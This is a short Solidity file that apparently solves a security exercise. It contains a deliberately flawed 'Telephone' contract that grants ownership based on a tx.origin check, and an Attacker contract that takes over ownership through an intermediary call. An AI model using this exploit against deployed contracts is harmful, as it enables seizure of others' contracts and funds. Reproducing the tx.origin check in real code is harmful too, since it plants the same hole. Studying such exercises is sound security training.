// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attacker{
    Telephone public s_telephone;

    constructor(address _telephoneAddress){
        s_telephone = Telephone(_telephoneAddress);
    }

    function atack(address  attackerAddress) external {
        s_telephone.changeOwner(attackerAddress);
    }

}